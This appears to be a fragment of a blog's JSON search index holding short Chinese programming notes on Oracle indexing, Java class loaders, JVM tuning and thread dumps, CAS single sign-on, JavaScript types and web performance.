      "content": "oracle的索引陷阱 一个表中有几百万条数据，对某个字段加了索引，但是查询时性能并没有什么提高，这主要可能是oracle的索引限制造成的。 oracle的索引有一些索引限制，在这些索引限制发生的情况下，即使已经加了索引，oracle还是会执行一次全表扫描，查询的性能不会比不加索引有所提高，反而可能由于数据库维护索引的系统开销造成性能更差。 下面是一些常见的索引限制问题。   使用不等于操作符(&lt;&gt;, !=) 下面这种情况，即使在列dept_id有一个索引，查询语句仍然执行一次全表扫描 select * from dept where staff_num &lt;&gt; 1000; 但是开发中的确需要这样的查询，难道没有解决问题的办法了吗？ 有！ 通过把用 or 语法替代不等号进行查询，就可以使用索引，以避免全表扫描：上面的语句改成下面这样的，就可以使用索引了。 select * from dept shere staff_num &lt; 1000 or dept_id &gt; 1000;   使用 is null 或 is not null 使用 is null 或is not null也会限制索引的使用，因为数据库并没有定义null值。如果被索引的列中有很多null，就不会使用这个索引（除非索引是一个位图索引，关于位图索引，会在以后的blog文章里做详细解释）。在sql语句中使用null会造成很多麻烦。 解决这个问题的办法就是：建表时把需要索引的列定义为非空(not null)   使用函数 如果没有使用基于函数的索引，那么where子句中对存在索引的列使用函数时，会使优化器忽略掉这些索引。下面的查询就不会使用索引： select * from staff where trunc(birthdate) = '01-MAY-82'; 但是把函数应用在条件上，索引是可以生效的，把上面的语句改成下面的语句，就可以通过索引进行查找。 select * from staff where birthdate &lt; (to_date('01-MAY-82') + 0.9999);   比较不匹配的数据类型 比较不匹配的数据类型也是难于发现的性能问题之一。 下面的例子中，dept_id是一个varchar2型的字段，在这个字段上有索引，但是下面的语句会执行全表扫描。 select * from dept where dept_id = 900198; 这是因为oracle会自动把where子句转换成to_number(dept_id)=900198，就是3所说的情况，这样就限制了索引的使用。 把SQL语句改为如下形式就可以使用索引 select * from dept where dept_id = '900198';      各种索引使用场合及建议   B*Tree索引 常规索引，多用于oltp系统，快速定位行，应建立于高cardinality列（即列的唯一值除以行数为一个很大的值，存在很少的相同值）。   Create index indexname on tablename(columnname[columnname...]) 反向索引。 B*Tree的衍生产物，应用于特殊场合，在ops环境加序列增加的列上建立，不适合做区域扫描。  Create index indexname on tablename(columnname[columnname...]) reverse 降序索引。 B*Tree的衍生产物，应用于有降序排列的搜索语句中，索引中储存了降序排列的索引码，提供了快速的降序搜索。   Create index indexname on tablename(columnname DESC[columnname...]) 位图索引。 位图方式管理的索引，适用于OLAP（在线分析）和DSS（决策处理）系统，应建立于低cardinality列， 适合集中读取，不适合插入和修改，提供比B*Tree索引更节省的空间。  Create BITMAP index indexname on tablename(columnname[columnname...]) 在实际应用中，如果某个字段的值需要频繁更新，那么就不适合在它上面创建位图索引。 在位图索引中，如果你更新或插入其中一条数值为N的记录， 那么相应表中数值为N的记录（可能成百上千条）全部被Oracle锁定， 这就意味着其它用户不能同时更新这些数值为N的记录，其它用户必须要等第一个用户提交后， 才能获得锁，更新或插入数据，bitmap index它主要用于决策支持系统或静态数据。 函数索引。 B*Tree的衍生产物，应用于查询语句条件列上包含函数的情况， 索引中储存了经过函数计算的索引码值。可以在不修改应用程序的基础上能提高查询效率。 索引创建策略 导入数据后再创建索引 不需要为很小的表创建索引 对于取值范围很小的字段（比如性别字段）应当建立位图索引 限制表中的索引的数目 为索引设置合适的PCTFREE值 存储索引的表空间最好单独设定 唯一索引和不唯一索引都只是针对B树索引而言. Oracle最多允许包含32个字段的复合索引 由此估计出一个查询如果使用某个索引会需要读入的数据块块数。 需要读入的数据块越多，则 cost 越大，Oracle 也就越有可能不选择使用 index   能用唯一索引，一定用唯一索引 能加非空，就加非空约束 一定要统计表的信息，索引的信息，柱状图的信息。 联合索引的顺序不同，影响索引的选择，尽量将值少的放在前面 只有做到以上几点，数据库才会正确的选择执行计划。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-203/"
    } ,
  
    {
      "title"    : "code review",
      "category" : "iteye",
      "content": "  Code Review时考虑到的有 从Collection中remove出来的对象标记为null 少用静态变量（全局变量，静态变量不会被GC自动回收？）      避免把生命周期不同的对象堆在一起成为一个大的对象      JDBC Connection/Statement/ResultSet异常正确处理 按代GC算法下，尽量用短生命周期的不变对象。比如用方法本地变量优于类实例变量 添加的listener在异常流程中没有释放。注意在finally中做释放     String与StringBuffer (一个疑问，编译器会不会做自动优化处理?） ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-6/"
    } ,
  
    {
      "title"    : "cluster nad non-cluster index",
      "category" : "index",
      "content": "clustered and nonclustered indexes A clustered index is a special type of index that reorders the way records in the table are physically stored. Therefore table can have only one clustered index. The leaf nodes of a clustered index contain the data pages. A nonclustered index is a special type of index in which the logical order of the index does not match the physical stored order of the rows on disk. The leaf node of a nonclustered index does not consist of the data pages. Instead, the leaf nodes contain index rows.   CLUSTER是段的一种类型。一个聚簇就是一个段，聚簇中的所有表根据聚簇列存放在同一个段中。这些表具有相同的物理存储结构。CLUSTER的主要优点包括： 由于不同表的数据根据CLUSTER键的顺序存放在一起，因此当对CLUSTER表之间连接访问时，会减少IO和存储访问时间；   虽然每个表都包含CLUSTER键，但这一列在CLUSTER中保存一份。因此可以减少存储的空间。   适合CLUSTER的表的特点：   表以查询为主，不适合以插入或修改为主的表；   经常通过连接一起查询的表。   对于索引 CLUSTER，注意首先创建CLUSTER，然后创建相应的CLUSTER表，最后一定要建立CLUSTER索引，如果不建立索引的话，没有任何记录可以插入到CLUSTER表中。 ",
      "url"      : "http://localhost:4000/2017/02/15/cluster-index/"
    } ,
  
    {
      "title"    : "JDK中用到的设计模式",
      "category" : "iteye",
      "content": "JDK中用到的设计模式 java.io 中用到了装饰模式和适配器模式 装饰模式， In general, each read request made of a Reader causes a corresponding read request to be made of the underlying character or byte stream. It is therefore advisable to wrap a BufferedReader around any Reader whose read() operations may be costly, such as FileReaders and InputStreamReaders.   BufferedReader in = new BufferedReader(new FileReader(foo.in)); 适配器模式, An InputStreamReader is a bridge from byte streams to character streams: It reads bytes and decodes them into characters using a specified charset. InputStreamReader(InputStream in, String charsetName)            Create an InputStreamReader that uses the default charset.   观察者模式 Observer和Observable Listener   工厂模式 Service Provider 模板方法 Integer.valueOf Class.forName 责任链模式 filter ",
      "url"      : "http://localhost:4000/2017/02/15/jdk-design-pattern/"
    } ,
  
    {
      "title"    : "构建高性能Web站点读后",
      "category" : "iteye",
      "content": "构建高性能Web站点读后 数据库层主要查询建索引,一个是全表扫描，一个是常量时间。通过explain 查询语句就知道了   通过memcached分布式缓存减少数据库或者磁盘文件IO,原则是把数据缓存到离使用者最近的地方   写操作也可以缓存，如果不要求实时更新到数据库的话。比如把某个页面的点击次数存储到数据库中的话，并不要求每点击一次就写一次数据库，可以积累到10次或者100次的时候再做一次更新。这对用户体验影响不大。（只要不直接读数据库这条记录，也就是要通过缓存的接口取值）   Web站点重定向实现的负载均衡Load Balance 镜像站点通过Http Redirect 302 和 Location header头镜像到各个子站点（用户所在地区的镜像，CDN）。通过重定向到子站点，可以很大程度扩充主Web站点的吞吐量（reqeust/second）     选择子站点有两种方式：     Round Robin，顺序选择。可以实现绝对的均衡，但需要记住最后一次分配的站点，代价比较高，需要考虑并发互斥存储该变量。     随机选择，hash当前时间，hash IP都是不错的选择。   DNS实现的负载均衡,同一个域名配多个IP（注意DNS配置中的A记录和CNAME记录） ",
      "url"      : "http://localhost:4000/2017/02/16/book-high-performance-site/"
    } ,
  
    {
      "title"    : "如何简单的得到Java进程的stack trace dump",
      "category" : "iteye",
      "content": "如何简单的得到Java进程的stack trace dump 最简单直接变态的方法是：找到这个java进程的id（linux下的ps或者windows下的jps），直接kill掉。 kill -3 pid java虚拟机没有hang住的情况下会立即dump stack trace；否则需要尝试下面的shell命令 kill pid kill -9 pid 三者分别对应linux中信号SIGQUIT, SIGTERM, SIGKILL ",
      "url"      : "http://localhost:4000/2017/02/16/java-stack-dump/"
    } ,
  
    {
      "title"    : "Javascript 数据类型和值",
      "category" : "iteye",
      "content": "Javascript 类型 五个基本类型（primitive data type) number，特殊的是NaN，Infinity，-Infinity。 NaN（Not a Number)实际上还是Number类型 string boolean undefined，唯一值是undefined null，唯一值是null   其他都是object data type. 包括数组 需要注意的一点是：所以值都可转化为true（通过!!两次取非）除了以下六个false值 &quot;&quot; 0 null undefined NaN false ",
      "url"      : "http://localhost:4000/2017/02/16/javascript-type/"
    } ,
  
    {
      "title"    : "Class Loader",
      "category" : "iteye",
      "content": "Java ClassLoader 调用自定义ClassLoader public class ClassLoaderTest {  public static void main(String[] args) {  MyClassLoader cl1 = new MyClassLoader();  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main-ClassNotFoundException&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IllegalAccessException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InstantiationException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { &lt;span class=&quot;kd&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getClassLoadingLock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// First, check if the class has already been loaded&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findLoadedClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nanoTime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findBootstrapClassOrNull&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ClassNotFoundException thrown if class not found&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// from the non-null parent class loader&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// If still not found, then invoke findClass in order&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// to find the class.&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;resolveClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 实现自定义java.lang.ClassLoader中的关键方法 public class MyClassLoader extends ClassLoader { &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;findClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loadClassData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 字节流转化为Class类&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;defineClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loadClassData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 根据文件名读取class文件并转换未字节流&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 类加载器的Delegate 除了引导类加载器之外，所有的类加载器都有一个父类加载器。类加载器在尝试自己去查找某个类的字节代码并定义它时，会先代理给其父类加载器，由父类加载器先去尝试加载这个类，依次类推。通过代理模式，对于 Java 核心库的类的加载工作由引导类加载器来统一完成，保证了Java 应用所使用的都是同一个版本的 Java 核心库的类，是互相兼容的。比如java.lang.Object   类的定义加载器与初始加载器 真正完成类的加载工作的类加载器和启动这个加载过程的类加载器，有可能不是同一个。真正完成类的加载工作是通过调用 defineClass 来实现的；而启动类的加载过程是通过调用 loadClass 来实现的。前者称为一个类的定义加载器（defining loader），后者称为初始加载器（initiating loader）。在 Java 虚拟机判断两个类是否相同的时候，使用的是类的定义加载器。也就是说，哪个类加载器启动类的加载过程并不重要，重要的是最终定义这个类的加载器。两种类加载器的关联之处在于：一个类的定义加载器是它引用的其它类的初始加载器。如类 com.example.Outer 引用了类 com.example.Inner，则由类 com.example.Outer 的定义加载器负责启动类 com.example.Inner 的加载过程。 线程上下文类加载器   java.lang.Thread.getContextClassLoader(); java.lang.Thread.setContextClassLoader(ClassLoader cl);  如果没有通过 setContextClassLoader(ClassLoader cl) 方法进行设置的话，线程将继承其父线程的上下文类加载器。Java 应用运行的初始线程的上下文类加载器是系统类加载器。在线程中运行的代码可以通过此类加载器来加载类和资源。 这通常发生在JVM核心代码必须动态加载由应用程序动态提供的资源时。拿JNDI为例，它的核心是由JRE核心类(rt.jar)实现的。但这些核心JNDI类必须能加载由第三方厂商提供的JNDI实现。这种情况下调用父类加载器（原初类加载器）来加载只有其子类加载器可见的类，这种代理机制就会失效。解决办法就是让核心JNDI类使用线程上下文类加载器，从而有效的打通类加载器层次结构，逆着代理机制的方向使用类加载器。常见的 SPI 有 JDBC、JCE、JNDI、JAXP 和 JBI 等。 这些 SPI 的接口由 Java 核心库来提供。这些 SPI 的实现代码很可能是作为 Java 应用所依赖的 jar 包被包含进来，可以通过类路径（CLASSPATH）来找到，如实现了 JAXP SPI 的 Apache Xerces 所包含的 jar 包。线程上下文类加载器正好解决了这个问题。如果不做任何的设置，Java 应用的线程的上下文类加载器默认就是系统上下文类加载器。在 SPI 接口的代码中使用线程上下文类加载器，就可以成功的加载到 SPI 实现的类。线程上下文类加载器在很多 SPI 的实现中都会用到. 来自网络的类加载器 NetworkClassLoader 负责通过网络下载 Java 类字节代码并定义出 Java 类。再通过NetworkClassLoader加载了某个版本的类之后，一般有两种做法来使用它。第一种做法是使用 Java 反射 API。另外一种做法是使用接口。需要注意的是，并不能直接在客户端代码中引用从服务器上下载的类，因为客户端代码的类加载器找不到这些类。使用 Java 反射 API 可以直接调用 Java 类的方法。而使用接口的做法则是把接口的类放在客户端中，从服务器上加载实现此接口的不同版本的类。在客户端通过相同的接口来使用这些实现类。   Web/Java EE 应用类加载器 delegate.   以 Apache Tomcat 来说，每个 Web 应用都有一个对应的类加载器实例。该类加载器也使用代理模式，所不同的是它是首先尝试去加载某个类，如果找不到再代理给父类加载器。这与一般类加载器的顺序是相反的。这是 Java Servlet 规范中的推荐做法，其目的是使得 Web 应用自己的类的优先级高于 Web 容器提供的类。这种代理模式的一个例外是：Java 核心库的类是不在查找范围之内的。这也是为了保证 Java 核心库的类型安全。 ",
      "url"      : "http://localhost:4000/2017/02/17/Java-ClassLoader/"
    } ,
  
    {
      "title"    : "ClassNotFoundException and NoClassDefFoundError",
      "category" : "iteye",
      "content": "ClassNotFoundException and NoClassDefFoundError From: http://jroller.com/sjivan/entry/difference_between_classnotfoundexception_and_noclassdeffounderror     A ClassNotFoundException is thrown when the reported class is not found by the ClassLoader. This typically means that the class is missing from the CLASSPATH. It could also mean that the class in question is trying to be loaded from another class which was loaded in a parent classloader and hence the class from the child classloader is not visible. This is sometimes the case when working in more complex environments like an App Server (WebSphere is infamous for such classloader issues).     People often tend to confuse java.lang.NoClassDefFoundError with java.lang.ClassNotFoundException however there's an important distinction. For example an exception (an error really since java.lang.NoClassDefFoundError is a subclass of java.lang.Error) like java.lang.NoClassDefFoundError: org/apache/activemq/ActiveMQConnectionFactory   does not mean that the ActiveMQConnectionFactory class is not in the CLASSPATH. In fact its quite the opposite. It means that the class ActiveMQConnectionFactory was found by the ClassLoader however when trying to load the class, it ran into an error reading the class definition. This typically happens when the class in question has static blocks or members which use a Class that's not found by the ClassLoader. So to find the culprit, view the source of the class in question (ActiveMQConnectionFactory in this case) and look for code using static blocks or static members.   On examining the code, say you find a line of code like below, make sure that the class SomeClass in in your CLASSPATH.    private static SomeClass foo = new SomeClass(); 注： 这种情况主要是编译时是有SomeClass的，运行时被删除找不到了就会报这种错误。 ",
      "url"      : "http://localhost:4000/2017/02/17/java-Class-Not-Found-Exception/"
    } ,
  
    {
      "title"    : "单点登陆 - CAS",
      "category" : "iteye",
      "content": "单点登陆 - CAS CAS is an authentication system originally created by Yale University to provide a trusted way for an application to authenticate a user.   CAS is an enterprise Single Sign-On solution for web services. Single Sign-On (SSO) means a better user experience when running a multitude of web services, each with its own means of authentication. With a SSO solution, different web services may authenticate to one authorative source of trust, that the user needs to log in to, instead of requiring the end-user to log in into each separate service.         CAS1 The Central Authentication Server (CAS) is designed as a standalone web application. It is currently implemented as several Java servlets and runs through the HTTPS server on secure.its.yale.edu. It is accessed through three URLs described below: the login URL, the validation URL, the optional logout URL.     CAS2     实现： CAS Web APP 使用 SSL 对于各个APP， 需要修改 web.xml 文件来配置 servlet 过滤器 ",
      "url"      : "http://localhost:4000/2017/02/18/CAS/"
    } ,
  
    {
      "title"    : "Java堆内存参数调优 -Xms -Xmx 参数",
      "category" : "iteye",
      "content": "Java堆内存参数调优 有的性能调优文章中建议-Xms和-Xmx参数调整到相同值是考虑到物理Server上主要只有一个Java应用，没必要初始堆比较小慢慢调整堆大小。   相反不适合的情况是如果一台物理Server上安装有多个Java 应用的时候，JVM的这两个参数应该不同，这个各个JVM动态调整各自堆的大小，物理机内存得到最大的利用。   -Xms -Xmx 参数大小决定了GC时间间隔和Pause Time.堆大小偏小的话，GC间隔时间小，Pause Time也小;堆大小偏大的话，GC间隔时间大，Pause Time也大。具体情况要多尝试找到平衡点。 ",
      "url"      : "http://localhost:4000/2017/02/18/java-heap-size/"
    } ,
  
    {
      "title"    : "lazy loading实现",
      "category" : "iteye",
      "content": "在进行O-R mapping时经常会碰到加载a graph of objects. 这是lazy loading应用的场景。如果不想把所有数据库中关联的表对象都一次性load到内存，可以参考下面的解决方法。 lazy initialization 简单来说就是使用前判断目标对象是否为null，是则真正从数据库加载。缺点是非null时并不总是代表对象加载了。还有一个缺点是domain类中加入了调用数据库的逻辑。   virtual proxy      主要考虑one-many关系，对应有一个List或者Set需要做lazy loading. 一般可以继承List/Set, 并在继承类中引用实际的List/Set 对象source(通过getSource() lazy loading)。继承的任何List/Set接口比如size(),iterator(),都通过getSource()检查是否已经初始化了，没有的话再从数据库中加载。   value holder     通过getCollectionA()接口隐藏实现。getCollectionA实际上是从value holder中获取目标Collection. value holder中封装了是否初始化了目标，数据库操作等。相对于第一种方法一个好处是数据库操作封装在value holder中，domain 类中不用关心了。   ",
      "url"      : "http://localhost:4000/2017/02/18/lazy-initialization/"
    } ,
  
    {
      "title"    : "架构 - 非功能性需求",
      "category" : "iteye",
